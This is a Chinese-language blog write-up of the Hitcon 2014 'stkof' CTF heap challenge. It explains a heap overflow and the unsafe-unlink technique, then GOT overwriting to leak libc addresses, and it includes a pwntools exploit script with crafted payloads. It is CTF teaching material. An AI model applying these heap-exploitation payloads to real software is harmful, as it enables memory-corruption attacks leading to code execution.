<h2 id="Hitcon-2014-stkof"><a href="#Hitcon-2014-stkof" class="headerlink" title="Hitcon 2014 stkof"></a>Hitcon 2014 stkof</h2><p>我们使用Hitcon 2014一道赛题来看看这种unlink的实战。<br>题目文件的<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof" target="_blank" rel="noopener">下载链接</a>  </p>
<ul>
<li><p>目标：我们的目标是通过标准输入完成任意代码执行。</p>
</li>
<li><p>调试环境搭建：使用patchelf失败，显示的是segment fault，现在还不清楚为什么，由于这个文件是一个可执行文件而不是共享目标文件，貌似patchelf在给可执行文件做patch的时候是有点问题。看到有一篇博文<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/06/01/note/" target="_blank" rel="noopener">RCTF 2020 Pwn note</a> 介绍了不用patch直接通过修改环境变量以及直接运行ld文件，把二进制文件当做参数传给ld文件的方法是可以成功的。受次启发，使用gdb的时候直接调试ld文件，然后在gdb设置环境变量和参数，但是同样报segment fault。无奈只能求助于gdbserver attach，由于我们是可以在命令中直接运行的，最终终于搭建调试环境，至于为什么其他方法不行，我有机会再研究，也欢迎知道原理的同学交流一下。</p>
<ul>
<li><p>由于后面还要往标准输入写入特殊符号，所以还是要借助python实现调试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">target = process(&quot;./stkof&quot;, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6_1&quot;&#125;)</span><br><span class="line">elf = ELF(&quot;stkof&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6_1&quot;)</span><br></pre></td></tr></table></figure>
<p>这些代码可以实现利用python起这个二进制文件，然后通过target.sendline发送任意的字符</p>
</li>
</ul>
</li>
<li><p>信息收集：看一下文件格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pws@pws:~/Desktop/workplace/heap_challenge/unlink$ file strof </span><br><span class="line">strof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, </span><br><span class="line">interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>尝试运行一下libc.so.6,发现是2.23版本的glibc<br><img src="/images/heap_exp/2021-05-22-20-35-44.png" alt><br>checksec可以看到开启了nx和栈cookie，<br><img src="/images/heap_exp/2021-05-22-20-35-16.png" alt><br>考虑堆溢出漏洞<br>利用ida分析二进制，先看一眼使用的库函数<br><img src="/images/heap_exp/2021-05-22-20-28-31.png" alt><br>有malloc，所以重点关注对堆内存的操作</p>
<ul>
<li><p>找到漏洞</p>
<ul>
<li><p>我们可以简单推断出这是一个堆溢出的漏洞，我们看下malloc的逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_400936()</span><br><span class="line">&#123;</span><br><span class="line">__int64 size; // [rsp+0h] [rbp-80h]</span><br><span class="line">char *v2; // [rsp+8h] [rbp-78h]</span><br><span class="line">char s[104]; // [rsp+10h] [rbp-70h] BYREF</span><br><span class="line">unsigned __int64 v4; // [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">v4 = __readfsqword(0x28u);</span><br><span class="line">fgets(s, 16, stdin);</span><br><span class="line">size = atoll(s);</span><br><span class="line">v2 = (char *)malloc(size);</span><br><span class="line">if ( !v2 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">(&amp;global_var)[++dword_602100] = v2;</span><br><span class="line">printf(&quot;%d\n&quot;, (unsigned int)dword_602100);</span><br><span class="line">return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>malloc的大小是用户可控的，再观察操作堆空间的地方</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fgets(s, 16, stdin);</span><br><span class="line">n = atoll(s);</span><br><span class="line">ptr = (&amp;global_var)[v2];</span><br><span class="line">for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) )</span><br></pre></td></tr></table></figure>
<p>同样是用户可以操控写入的长度的，所以这个的确是一个堆溢出的漏洞。</p>
</li>
</ul>
</li>
<li><p>利用思路</p>
<ul>
<li>我们可以看到这个被溢出的堆的地址被写入了global_var这个数组里面，而且我们也可以连续触发两个malloc得到连续的chunk，因此符合我们的unlink利用条件。</li>
<li><p>首先需要两次malloc，我们同样尝试malloc的参数为0xa0,根据逆向结果我们输入1就可以触发分配的逻辑</p>
<ul>
<li><p>我们通过1 0xa0 连续3次得到了两个挨着的大小为0xb0的chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1 :0x0000000000e064e0      </span><br><span class="line">chunk2 :0x0000000000e06590</span><br></pre></td></tr></table></figure>
</li>
<li><p>现在我们要在chunk1中构造一个虚假的chunk，目的是骗过unlink的检查</p>
<ul>
<li>存储chunk1指针的地址为0x602150,我们要把0x602150-3*8 和 0x602150-2*8放到内存中，按照下面这个图<br><img src="/images/heap_exp/2021-05-23-15-28-37.png" alt></li>
<li>我们只需要根据程序的业务照做这件事就行了，首先得到chunk1的控制权,我们需要根据索引值得到，根据这个图<br><img src="/images/heap_exp/2021-05-23-17-23-42.png" alt><br>我们则可以看出来chunk1 相对于0x0000000000e064e0 0x602140这个数组开始地址的偏移为2，所以我们要输入2来获得对这个堆的控制权。</li>
</ul>
</li>
<li><p>现在我们要溢出chunk1，修改chunk2的的开头部分</p>
<ul>
<li><p>所以我们要得到需要写入的长度为0xa0 + 8*2 = 0xb0<br><img src="/images/heap_exp/2021-05-23-17-30-54.png" alt>   </p>
<ul>
<li>需要溢出chunk2的prev size和curent size两个字段，分别赋值为0xa0,和0xb0</li>
<li><p>因此我们构造的payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addr_of_chunk1_ptr = 0x602150</span><br><span class="line">fake_fd = addr_of_chunk1_ptr - 8 *3</span><br><span class="line">fake_bk = addr_of_chunk1_ptr - 8 * 2</span><br><span class="line">payload = (p64(0x0) + p64(0xa0) + p64(fake_fd) + p64(fake_bk)).ljust(0xa0,&apos;\x00&apos;) + p64(0xa0) + p64(0xb0)</span><br></pre></td></tr></table></figure>
</li>
<li><p>发送我们的数据之后的内存布局</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0xe064e0:       0x0000000000000000      0x00000000000000a0</span><br><span class="line">0xe064f0:       0x0000000000602138      0x0000000000602140</span><br><span class="line">...</span><br><span class="line">0xe06580:       0x00000000000000a0      0x00000000000000b0</span><br><span class="line">0xe06590:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
<li><p>然后我们需要释放chunk2指针</p>
<ul>
<li>执行<code>remove(3)</code></li>
<li>我们再次观察全局数组的存储变量<br><img src="/images/heap_exp/2021-05-23-17-46-43.png" alt></li>
<li>可以看到我们存储heap指针的地方已经变为了0x602150 - 3 * 8 = 0x0x602138</li>
<li>因此我们已经实现了unlink操作，后面可以通过操作0x602138指针来重写0x602150中的内容，我们可以借助这个实现往任意地址写入任意内容的操作，但是如何利用这个获取root shell呢？</li>
</ul>
</li>
<li>要想获取root shell我们就必须能够调用类似system的这种函数<ul>
<li>我们目前拥有对内存空间任意读写的能力，那么只要我们能够知道system函数的地址，我们就可以把system函数地址写入到一个会被调用的函数，如free，strlen等等的got表中，但是关键问题是如何获得system函数地址</li>
</ul>
</li>
<li>如何获得system函数地址<ul>
<li>由于二进制文件中没有调用system，所以不能通过plt调用system，我们只能想办法获得system在libc中的地址，但是由于开启了随机化后，这个地址就是不是固定的，索性的是我们可以通过其他库函数的地址，通过相对偏移获得system函数地址</li>
<li>那么问题转化成了如何获取其他库函数，比如strlen函数的地址<ul>
<li>由于strlen函数被调用了，那么二进制中的got表中就包含strlen项，如果我们能够通过puts，printf，write等函数打印这个strlen在got表中的地址，就能够得到got表中包含strlen的真实地址。</li>
<li>那么如何让打印函数传入got表的内存地址呢<ul>
<li>首先挑选一个打印函数，比如我们可以使用puts函数来打印内存，因为puts比较简单，只需要一个参数</li>
<li>然后再物色一个拥有参数是用户可控的地址的函数，这个要结合二进制函数的业务，符合这个条件的函数有<ul>
<li><code>strlen((&amp;global_var)[v1]) &lt;= 3</code></li>
<li><code>free((&amp;global_var)[v1])</code></li>
</ul>
</li>
<li>让(&amp;global_var)[v1]的值为got表一个库函数的地址值，比如free函数got表地址0x602018<ul>
<li>就是往内存中写入0x602018，这个是可以实现的，因为我们已经可以通过unlink拿到了对0x0x602138之后内存的读写权限，并且可以写入任意内容。</li>
</ul>
</li>
<li>然后我们通过修改free或者strlen的got表，让他们的内容修改为puts函数的plt表的地址，那么以后在调用free或者strlen函数的时候就可以调用puts</li>
<li>unlink之后我们可以读写地址为0x0602138开始的内存,借助这个我们可以修改0x602150内存中的内容为strlen got表地址，，strlen在got表中的地址为0x602030。修改0x602148中的内容为free got表地址0x602018</li>
<li>我们可以通过业务逻辑发送payload为<code>p64(0) + p64(0) + p64(0x602018) + p64(0x602030)</code></li>
<li>发送payload之前0x602138中的内容为<ul>
<li><img src="/images/heap_exp/2021-05-23-19-25-19.png" alt></li>
</ul>
</li>
<li>发送payload之后的内容为<ul>
<li><img src="/images/heap_exp/2021-05-23-20-41-27.png" alt></li>
</ul>
</li>
<li>我们可以看到我们已经将strlen和free的got表地址写入到了数组中</li>
<li>我们再次利用业务逻辑就可以修改strlen的got表为puts.plt为0x400760<ul>
<li><img src="/images/heap_exp/2021-05-23-19-27-30.png" alt></li>
<li>这次的payload为p64(0x400760)</li>
<li>我们先看发送数据之前strlen got表中的内容为<ul>
<li><img src="/images/heap_exp/2021-05-23-19-30-09.png" alt></li>
<li>由于我们还没有调用这个函数，所以它的值为0</li>
</ul>
</li>
<li>然后我们看看发送完数据之后的内容为<ul>
<li><img src="/images/heap_exp/2021-05-23-20-09-18.png" alt></li>
<li>我们已经成功修改了strlen的got表，让他指向了puts</li>
</ul>
</li>
</ul>
</li>
<li>我们只需要调用strlen((&amp;global_var)[v1]) 让 (&amp;global_var)[v1]值为0x602018,就可以触发puts(0x602018)，而0x602018中存储的是真正的free函数的地址<ul>
<li>通过业务逻辑调用strlen，让v1为1的得到free的地址</li>
<li>得到free的地址为<br><img src="/images/heap_exp/2021-05-23-20-50-49.png" alt></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>拿到free的地址之后，我们就可以进一步得到system函数的地址，后面的事情就比较简单了。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>我的exp代码，到返回free地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">target = process(&quot;./stkof&quot;, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6_1&quot;&#125;)</span><br><span class="line">elf = ELF(&quot;stkof&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6_1&quot;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(target, gdbscript=&apos;b *0x400b7a&apos;)</span><br><span class="line"></span><br><span class="line"># I/O Functions</span><br><span class="line">def add(size):</span><br><span class="line">  target.sendline(&quot;1&quot;)</span><br><span class="line">  target.sendline(str(size))</span><br><span class="line">  print target.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">def write_data(index, size, data):</span><br><span class="line">  target.sendline(&quot;2&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  target.sendline(str(size))</span><br><span class="line">  target.send(data)</span><br><span class="line">  print target.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">def remove(index):</span><br><span class="line">  target.sendline(&quot;3&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  print target.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">def view(index):</span><br><span class="line">  target.sendline(&quot;4&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  #print &quot;pillar&quot;</span><br><span class="line">  leak = target.recvline()</span><br><span class="line">  leak = leak.replace(&quot;\x0a&quot;, &quot;&quot;)</span><br><span class="line">  leak = u64(leak + &quot;\x00&quot;*(8-len(leak)))</span><br><span class="line">  print hex(leak)</span><br><span class="line">  #print &quot;men&quot;</span><br><span class="line">  print target.recvuntil(&quot;OK\n&quot;)</span><br><span class="line">  return leak</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr_of_chunk1_ptr = 0x602150</span><br><span class="line">fake_fd = addr_of_chunk1_ptr - 8 *3</span><br><span class="line">fake_bk = addr_of_chunk1_ptr - 8 * 2</span><br><span class="line">payload = (p64(0x0) + p64(0xa0) + p64(fake_fd) + p64(fake_bk)).ljust(0xa0,&apos;\x00&apos;) + p64(0xa0) + p64(0xb0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = p64(0) + p64(0) + p64(0x602018) + p64(0x602030)</span><br><span class="line">payload3 = p64(0x400760)</span><br><span class="line"></span><br><span class="line">add(0xa0)</span><br><span class="line">add(0xa0)</span><br><span class="line">add(0xa0)</span><br><span class="line">write_data(2,0xb0,payload)</span><br><span class="line">remove(3)</span><br><span class="line">write_data(2,8*4,payload2)</span><br><span class="line">write_data(2,8,payload3)</span><br><span class="line">view(1)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>虽然这种unlink攻击并不能实现任意地址写入任意内容的攻击效果，但是如果符合这种一个数组中包含有一个指向堆的指针这种场景，并且这个堆可以溢出修改后面的chunk，即能够得到两个相邻的chunk，在free被溢出的chunk的时候，那么本来指向heap的指针就实际上指向的是数组，那么如果后续有用到heap指针的地方，就可以实现对数组的读写。</p>
<p>而实际上这个堆指针就是一个指向可以被用户读写的内存的指针，因此我们的利用思路可以是当有一个堆指针被写入了一个数组，我们通过溢出将存储这个堆指针的元素变成了存储数组的开头，然后我们通过业务代码继续操作这个被篡改了的“堆指针”去修改数组的内容，我们可以进一步修改存储这个“堆指针”的地方。</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/categories/">分类</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#unlink%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.</span> <span class="toc-text">unlink实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hitcon-2014-stkof"><span class="toc-number">2.</span> <span class="toc-text">Hitcon 2014 stkof</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">小结</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&text=堆利用系列三：Unlink"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&title=堆利用系列三：Unlink"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&is_video=false&description=堆利用系列三：Unlink"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=堆利用系列三：Unlink&body=Check out this article: https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&title=堆利用系列三：Unlink"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&title=堆利用系列三：Unlink"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&title=堆利用系列三：Unlink"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&title=堆利用系列三：Unlink"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&name=堆利用系列三：Unlink&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&t=堆利用系列三：Unlink"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2021
    Colorlight
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/categories/">分类</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
